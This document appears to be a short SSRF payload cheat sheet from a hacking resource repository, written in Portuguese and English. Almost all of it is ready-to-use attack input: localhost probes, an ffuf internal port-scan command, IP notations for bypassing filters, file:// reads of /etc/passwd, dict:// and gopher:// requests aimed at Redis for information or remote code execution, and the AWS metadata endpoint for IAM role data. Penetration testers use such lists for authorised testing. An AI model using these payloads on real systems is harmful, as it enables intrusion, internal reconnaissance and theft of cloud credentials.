## Payloads
### Teste Básico
```
http://localhost
http://127.0.0.1
```
## Port Scanning
```
ffuf -u 'http://exemplo.com/fetch?url=HOST:PORT' -H 'Cookie: session=valor; id=valor' -w hosts.txt:HOST -w ports.txt:PORT'
```
## Scripts 
#### Criar lista de IPs: [ip_range_wordlist.sh](https://github.com/carineconstantino/hacking_br/blob/main/Resources/ssrf/ip_range_wordlist.sh)
#### Criar lists de IPs decimal: [ip_decimal_wordlist.sh](https://github.com/carineconstantino/hacking_br/blob/main/Resources/ssrf/ip_decimal_wordlist.sh)

## Different IP Notations
To bypass IP-based filters
```
http://[::]:80/ (IPv6)
http://0 (Special IP)
```

## Local File Read
```
file:///etc/passwd
file:///c:/windows/win.ini
```

## URL Scheme Exploit
### DICT
To gather information from services like Redis by connecting via the DICT protocol.<p>
The response from the Redis server's INFO command is returned.
```
dict://127.0.0.1:6379/INFO
```
### Gopher
To send raw TCP commands to services like Redis with the Gopher protocol to change state or attempt RCE.<p>
Usually, no response is returned (blind). Success must be verified through other means.
```
gopher://127.0.0.1:6379/_...
```

## Cloud Metadata Access (AWS)
To retrieve general information (e.g., hostname, IAM role name) from the AWS metadata service.<p>
The respective metadata information (e.g., admin-role) is returned.
```
http://169.254.169.254/latest/meta-data/
```



